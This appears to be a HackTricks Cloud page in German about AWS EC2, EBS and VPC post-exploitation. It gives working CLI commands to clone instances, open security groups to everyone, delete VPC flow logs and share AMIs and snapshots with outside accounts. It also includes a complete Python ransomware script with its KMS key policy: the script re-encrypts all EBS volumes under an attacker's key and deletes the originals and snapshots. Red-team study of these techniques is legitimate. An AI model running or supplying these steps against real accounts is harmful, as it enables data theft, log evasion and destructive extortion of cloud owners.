# AWS - EC2, EBS, SSM & VPC Post Exploitation

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks in PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositorys senden.

</details>

## EC2 & VPC

F√ºr weitere Informationen siehe:

{% content-ref url="../../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/" %}
[aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum](../../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/)
{% endcontent-ref %}

### **B√∂sartiger VPC-Spiegel -** `ec2:DescribeInstances`, `ec2:RunInstances`, `ec2:CreateSecurityGroup`, `ec2:AuthorizeSecurityGroupIngress`, `ec2:CreateTrafficMirrorTarget`, `ec2:CreateTrafficMirrorSession`, `ec2:CreateTrafficMirrorFilter`, `ec2:CreateTrafficMirrorFilterRule`

VPC-Verkehrsspiegelung **dupliziert den ein- und ausgehenden Verkehr f√ºr EC2-Instanzen innerhalb eines VPCs**, ohne dass etwas auf den Instanzen selbst installiert werden muss. Dieser duplizierte Verkehr w√ºrde normalerweise an ein Netzwerk-Eindringungserkennungssystem (IDS) zur Analyse und √úberwachung gesendet.\
Ein Angreifer k√∂nnte dies missbrauchen, um den gesamten Verkehr zu erfassen und sensible Informationen daraus zu erhalten:

F√ºr weitere Informationen siehe diese Seite:

{% content-ref url="aws-malicious-vpc-mirror.md" %}
[aws-malicious-vpc-mirror.md](aws-malicious-vpc-mirror.md)
{% endcontent-ref %}

### Laufende Instanz kopieren

Instanzen enthalten in der Regel sensible Informationen. Es gibt verschiedene M√∂glichkeiten, hineinzugelangen (√ºberpr√ºfen Sie [EC2-Privileg-Eskalationstricks](../../aws-privilege-escalation/aws-ec2-privesc.md)). Eine andere M√∂glichkeit, herauszufinden, was sie enth√§lt, besteht jedoch darin, **ein AMI zu erstellen und eine neue Instanz (auch in Ihrem eigenen Konto) daraus auszuf√ºhren**:

```shell
# List instances
aws ec2 describe-images

# create a new image for the instance-id
aws ec2 create-image --instance-id i-0438b003d81cd7ec5 --name "AWS Audit" --description "Export AMI" --region eu-west-1

# add key to AWS
aws ec2 import-key-pair --key-name "AWS Audit" --public-key-material file://~/.ssh/id_rsa.pub --region eu-west-1

# create ec2 using the previously created AMI, use the same security group and subnet to connect easily.
aws ec2 run-instances --image-id ami-0b77e2d906b00202d --security-group-ids "sg-6d0d7f01" --subnet-id subnet-9eb001ea --count 1 --instance-type t2.micro --key-name "AWS Audit" --query "Instances[0].InstanceId" --region eu-west-1

# now you can check the instance
aws ec2 describe-instances --instance-ids i-0546910a0c18725a1

# If needed : edit groups
aws ec2 modify-instance-attribute --instance-id "i-0546910a0c18725a1" --groups "sg-6d0d7f01"  --region eu-west-1

# be a good guy, clean our instance to avoid any useless cost
aws ec2 stop-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
aws ec2 terminate-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
```

### EBS Snapshot dump

**Snapshots sind Backups von Volumes**, die in der Regel **sensible Informationen** enthalten, daher sollte die √úberpr√ºfung dieser Informationen diese Informationen offenlegen.\
Wenn Sie ein **Volume ohne Snapshot** finden, k√∂nnten Sie: **einen Snapshot erstellen** und die folgenden Aktionen durchf√ºhren oder es einfach in einer Instanz innerhalb des Kontos **einbinden**:

{% content-ref url="aws-ebs-snapshot-dump.md" %}
[aws-ebs-snapshot-dump.md](aws-ebs-snapshot-dump.md)
{% endcontent-ref %}

### Datenexfiltration

#### DNS-Exfiltration

Auch wenn Sie einen EC2 so sperren, dass kein Datenverkehr nach au√üen gelangen kann, kann er immer noch **√ºber DNS exfiltriert werden**.

* **VPC Flow Logs werden dies nicht aufzeichnen**.
* Sie haben keinen Zugriff auf AWS DNS-Protokolle.
* Deaktivieren Sie dies, indem Sie "enableDnsSupport" auf false setzen mit:

`aws ec2 modify-vpc-attribute --no-enable-dns-support --vpc-id <vpc-id>`

#### Exfiltration √ºber API-Aufrufe

Ein Angreifer k√∂nnte API-Endpunkte eines von ihm kontrollierten Kontos aufrufen. Cloudtrail wird diese Aufrufe protokollieren und der Angreifer wird in der Lage sein, die exfiltrierten Daten in den Cloudtrail-Protokollen zu sehen.

### Offene Sicherheitsgruppe

Sie k√∂nnten weiteren Zugriff auf Netzwerkdienste erhalten, indem Sie Ports wie folgt √∂ffnen:

{% code overflow="wrap" %}
```bash
aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 80 --cidr 0.0.0.0/0
# Or you could just open it to more specific ips or maybe th einternal network if you have already compromised an EC2 in the VPC
```
{% endcode %}

### Privilege Escalation zu ECS

Es ist m√∂glich, eine EC2-Instanz auszuf√ºhren und sie zu registrieren, um f√ºr das Ausf√ºhren von ECS-Instanzen verwendet zu werden und dann die Daten der ECS-Instanzen zu stehlen.

F√ºr **weitere Informationen siehe hier**.

### VPC-Flussprotokolle entfernen

```bash
aws ec2 delete-flow-logs --flow-log-ids <flow_log_ids> --region <region>
```

### AMI teilen

{% code overflow="wrap" %}
```
```
{% endcode %}

```bash
aws ec2 modify-image-attribute --image-id <image_ID> --launch-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```

### EBS-Snapshot teilen

{% code overflow="wrap" %}
```bash
aws ec2 modify-snapshot-attribute --snapshot-id <snapshot_ID> --create-volume-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
{% endcode %}

### EBS Ransomware PoC

Ein Proof of Concept √§hnlich der Ransomware-Demonstration, die in den S3-Post-Exploitation-Notizen gezeigt wurde. KMS sollte in RMS umbenannt werden, da es so einfach ist, verschiedene AWS-Services damit zu verschl√ºsseln.

Zuerst erstellen Sie von einem 'Angreifer'-AWS-Konto aus einen kundenverwalteten Schl√ºssel in KMS. In diesem Beispiel l√§sst AWS die Schl√ºsseldaten f√ºr mich verwalten, aber in einem realistischen Szenario w√ºrde ein b√∂sartiger Akteur die Schl√ºsseldaten au√üerhalb der Kontrolle von AWS behalten. √Ñndern Sie die Schl√ºsselpolitik, um jedem AWS-Konto-Principal die Verwendung des Schl√ºssels zu erm√∂glichen. F√ºr diese Schl√ºsselpolitik lautete der Kontoname 'AttackSim' und die Richtlinienregel, die den gesamten Zugriff erm√∂glicht, hei√üt 'Outside Encryption'.

```
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Outside Encryption",
"Effect": "Allow",
"Principal": {
"AWS": "*"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey",
"kms:GenerateDataKeyWithoutPlainText",
"kms:CreateGrant"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:CreateGrant",
"kms:ListGrants",
"kms:RevokeGrant"
],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```

Die Schl√ºsselrichtlinie erfordert die folgenden Berechtigungen, um die Verschl√ºsselung eines EBS-Volumes zu erm√∂glichen:

* `kms:CreateGrant`
* `kms:Decrypt`
* `kms:DescribeKey`
* `kms:GenerateDataKeyWithoutPlainText`
* `kms:ReEncrypt`

Nun, da der √∂ffentlich zug√§ngliche Schl√ºssel verwendet werden kann, k√∂nnen wir ein 'Opfer'-Konto verwenden, das einige EC2-Instanzen mit unverschl√ºsselten EBS-Volumes erstellt hat. Diese EBS-Volumes des 'Opfer'-Kontos sind unser Ziel f√ºr die Verschl√ºsselung. Dieser Angriff erfolgt unter der Annahme eines Sicherheitsvorfalls in einem AWS-Konto mit hohen Privilegien.

√Ñhnlich wie im Beispiel des S3-Ransomware-Angriffs. Dieser Angriff erstellt Kopien der angeh√§ngten EBS-Volumes mithilfe von Snapshots, verwendet den √∂ffentlich verf√ºgbaren Schl√ºssel aus dem 'Angreifer'-Konto, um die neuen EBS-Volumes zu verschl√ºsseln, trennt dann die originalen EBS-Volumes von den EC2-Instanzen und l√∂scht sie und l√∂scht schlie√ülich die Snapshots, die zur Erstellung der neu verschl√ºsselten EBS-Volumes verwendet wurden.

Dies f√ºhrt dazu, dass nur verschl√ºsselte EBS-Volumes im Konto verbleiben.

Au√üerdem ist zu beachten, dass das Skript die EC2-Instanzen angehalten hat, um die originalen EBS-Volumes zu trennen und zu l√∂schen. Die urspr√ºnglichen unverschl√ºsselten Volumes sind jetzt verschwunden.

Kehren Sie als N√§chstes zur Schl√ºsselrichtlinie im 'Angreifer'-Konto zur√ºck und entfernen Sie die Richtlinienregel 'Outside Encryption' aus der Schl√ºsselrichtlinie.

```json
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:CreateGrant",
"kms:ListGrants",
"kms:RevokeGrant"
],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```

Warten Sie einen Moment, bis die neu festgelegte Schl√ºsselrichtlinie verbreitet ist. Gehen Sie dann zum 'Opfer'-Konto zur√ºck und versuchen Sie, eines der neu verschl√ºsselten EBS-Volumes anzuh√§ngen. Sie werden feststellen, dass Sie das Volume anh√§ngen k√∂nnen.

![Eingef√ºgtes Bild 20231231174131](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/ba9e5340-7020-4af9-95cc-0e02267ced47) ![Eingef√ºgtes Bild 20231231174258](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/6c3215ec-4161-44e2-b1c1-e32f43ad0fa4)

Aber wenn Sie versuchen, die EC2-Instanz tats√§chlich mit dem verschl√ºsselten EBS-Volume neu zu starten, wird der Startvorgang einfach fehlschlagen und von 'ausstehend' wieder in den 'gestoppten' Zustand √ºbergehen, da das angeh√§ngte EBS-Volume nicht mit dem Schl√ºssel entschl√ºsselt werden kann, da die Schl√ºsselrichtlinie dies nicht mehr zul√§sst.

![Eingef√ºgtes Bild 20231231174322](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/73456c22-0828-4da9-a737-e4d90fa3f514) ![Eingef√ºgtes Bild 20231231174352](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4d83a90e-6fa9-4003-b904-a4ba7f5944d0)

Dies ist das verwendete Python-Skript. Es verwendet AWS-Anmeldeinformationen f√ºr ein 'Opfer'-Konto und einen √∂ffentlich verf√ºgbaren AWS-ARN-Wert f√ºr den zur Verschl√ºsselung verwendeten Schl√ºssel. Das Skript erstellt verschl√ºsselte Kopien ALLER verf√ºgbaren EBS-Volumes, die an ALLE EC2-Instanzen im angezielten AWS-Konto angeh√§ngt sind, stoppt dann jede EC2-Instanz, l√∂st die originalen EBS-Volumes ab, l√∂scht sie und l√∂scht schlie√ülich alle w√§hrend des Prozesses verwendeten Snapshots. Es bleiben nur verschl√ºsselte EBS-Volumes im angezielten 'Opfer'-Konto √ºbrig. VERWENDEN SIE DIESES SKRIPT NUR IN EINER TESTUMGEBUNG, ES IST DESTRUKTIV UND WIRD ALLE ORIGINAL EBS-VOLUMES L√ñSCHEN. Sie k√∂nnen sie mithilfe des verwendeten KMS-Schl√ºssels wiederherstellen und √ºber Snapshots in ihren urspr√ºnglichen Zustand zur√ºckversetzen, aber ich m√∂chte Sie nur darauf hinweisen, dass dies letztendlich ein Ransomware-PoC ist.

```
import boto3
import argparse
from botocore.exceptions import ClientError

def enumerate_ec2_instances(ec2_client):
instances = ec2_client.describe_instances()
instance_volumes = {}
for reservation in instances['Reservations']:
for instance in reservation['Instances']:
instance_id = instance['InstanceId']
volumes = [vol['Ebs']['VolumeId'] for vol in instance['BlockDeviceMappings'] if 'Ebs' in vol]
instance_volumes[instance_id] = volumes
return instance_volumes

def snapshot_volumes(ec2_client, volumes):
snapshot_ids = []
for volume_id in volumes:
snapshot = ec2_client.create_snapshot(VolumeId=volume_id)
snapshot_ids.append(snapshot['SnapshotId'])
return snapshot_ids

def wait_for_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
ec2_client.get_waiter('snapshot_completed').wait(SnapshotIds=[snapshot_id])

def create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn):
new_volume_ids = []
for snapshot_id in snapshot_ids:
snapshot_info = ec2_client.describe_snapshots(SnapshotIds=[snapshot_id])['Snapshots'][0]
volume_id = snapshot_info['VolumeId']
volume_info = ec2_client.describe_volumes(VolumeIds=[volume_id])['Volumes'][0]
availability_zone = volume_info['AvailabilityZone']

volume = ec2_client.create_volume(SnapshotId=snapshot_id, AvailabilityZone=availability_zone,
Encrypted=True, KmsKeyId=kms_key_arn)
new_volume_ids.append(volume['VolumeId'])
return new_volume_ids

def stop_instances(ec2_client, instance_ids):
for instance_id in instance_ids:
try:
instance_description = ec2_client.describe_instances(InstanceIds=[instance_id])
instance_state = instance_description['Reservations'][0]['Instances'][0]['State']['Name']

if instance_state == 'running':
ec2_client.stop_instances(InstanceIds=[instance_id])
print(f"Stopping instance: {instance_id}")
ec2_client.get_waiter('instance_stopped').wait(InstanceIds=[instance_id])
print(f"Instance {instance_id} stopped.")
else:
print(f"Instance {instance_id} is not in a state that allows it to be stopped (current state: {instance_state}).")

except ClientError as e:
print(f"Error stopping instance {instance_id}: {e}")

def detach_and_delete_volumes(ec2_client, volumes):
for volume_id in volumes:
try:
ec2_client.detach_volume(VolumeId=volume_id)
ec2_client.get_waiter('volume_available').wait(VolumeIds=[volume_id])
ec2_client.delete_volume(VolumeId=volume_id)
print(f"Deleted volume: {volume_id}")
except ClientError as e:
print(f"Error detaching or deleting volume {volume_id}: {e}")


def delete_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
try:
ec2_client.delete_snapshot(SnapshotId=snapshot_id)
print(f"Deleted snapshot: {snapshot_id}")
except ClientError as e:
print(f"Error deleting snapshot {snapshot_id}: {e}")

def replace_volumes(ec2_client, instance_volumes):
instance_ids = list(instance_volumes.keys())
stop_instances(ec2_client, instance_ids)

all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
detach_and_delete_volumes(ec2_client, all_volumes)

def ebs_lock(access_key, secret_key, region, kms_key_arn):
ec2_client = boto3.client('ec2', aws_access_key_id=access_key, aws_secret_access_key=secret_key, region_name=region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn)  # New encrypted volumes are created but not attached
replace_volumes(ec2_client, instance_volumes)  # Stops instances, detaches and deletes old volumes
delete_snapshots(ec2_client, snapshot_ids)  # Optionally delete snapshots if no longer needed

def parse_arguments():
parser = argparse.ArgumentParser(description='EBS Volume Encryption and Replacement Tool')
parser.add_argument('--access-key', required=True, help='AWS Access Key ID')
parser.add_argument('--secret-key', required=True, help='AWS Secret Access Key')
parser.add_argument('--region', required=True, help='AWS Region')
parser.add_argument('--kms-key-arn', required=True, help='KMS Key ARN for EBS volume encryption')
return parser.parse_args()

def main():
args = parse_arguments()
ec2_client = boto3.client('ec2', aws_access_key_id=args.access_key, aws_secret_access_key=args.secret_key, region_name=args.region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, args.kms_key_arn)
replace_volumes(ec2_client, instance_volumes)
delete_snapshots(ec2_client, snapshot_ids)

if __name__ == "__main__":
main()
```

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>
